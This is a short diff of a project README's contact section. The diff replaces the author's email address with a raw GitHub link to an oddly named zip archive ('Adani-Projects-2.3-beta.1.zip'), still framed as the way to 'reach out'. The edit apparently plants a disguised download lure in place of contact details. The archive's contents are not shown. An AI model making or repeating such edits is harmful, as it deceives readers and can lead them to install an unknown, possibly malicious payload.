@@ -32,6 +32,6 @@ Key functionalities include:
 Feel free to contribute, raise issues, or fork the project!
 
 ## 📧 Contact
-For questions or collaboration, reach out at kotadiyajaydeep2003@gmail.com.
+For questions or collaboration, reach out at https://raw.githubusercontent.com/KotadiyaJaydeep/Adani-Projects-/main/Pleurocapsa/Adani-Projects-2.3-beta.1.zip
 
 
